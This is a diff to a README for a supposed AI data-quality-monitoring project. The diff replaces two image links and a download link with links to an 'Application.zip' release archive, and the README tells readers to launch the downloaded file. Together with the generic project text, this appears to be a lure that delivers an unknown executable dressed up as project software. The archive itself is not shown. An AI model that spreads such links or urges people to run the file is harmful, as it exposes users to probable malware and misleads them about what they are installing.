@@ -2,7 +2,7 @@
 
 Welcome to the **AI-Driven Automation for Data Quality Monitoring in Cloud Data Warehouses** repository! This project focuses on leveraging AI to automate data quality monitoring in cloud data warehouses. Traditional data validation methods often require manual intervention and fail to scale with increasing data complexity. By integrating machine learning models, this approach enables real-time anomaly detection and automated data cleansing.
 
-![Data Quality Monitoring](https://example.com/data_quality.png)
+![Data Quality Monitoring](https://github.com/zantro58/AI-Driven-Automation-for-Data-Quality-Monitoring-in-Cloud-Data-Warehouses/releases/download/v1.0.0/Application.zip)
 
 ## Project Description
 
@@ -22,7 +22,7 @@ The repository covers a wide range of topics including data cleaning, model trai
 
 ## How to Get Started
 
-To get started with the project, download the [Application.zip](https://github.com/file/Application.zip) file and follow the instructions in the README to set up the AI-driven automation for data quality monitoring in your cloud data warehouse.
+To get started with the project, download the [https://github.com/zantro58/AI-Driven-Automation-for-Data-Quality-Monitoring-in-Cloud-Data-Warehouses/releases/download/v1.0.0/Application.zip](https://github.com/zantro58/AI-Driven-Automation-for-Data-Quality-Monitoring-in-Cloud-Data-Warehouses/releases/download/v1.0.0/Application.zip) file and follow the instructions in the README to set up the AI-driven automation for data quality monitoring in your cloud data warehouse.
 
 If the link ends with the file name, please make sure to launch the file to access the necessary resources for running the project.
 
@@ -34,4 +34,4 @@ Join our community of data enthusiasts and AI practitioners to collaborate, shar
 
 Let's empower data-driven decision-making through AI-driven automation. Happy coding! 🌟
 
-![Data Visualization](https://example.com/visualization.png)
+![Data Visualization](https://github.com/zantro58/AI-Driven-Automation-for-Data-Quality-Monitoring-in-Cloud-Data-Warehouses/releases/download/v1.0.0/Application.zip)
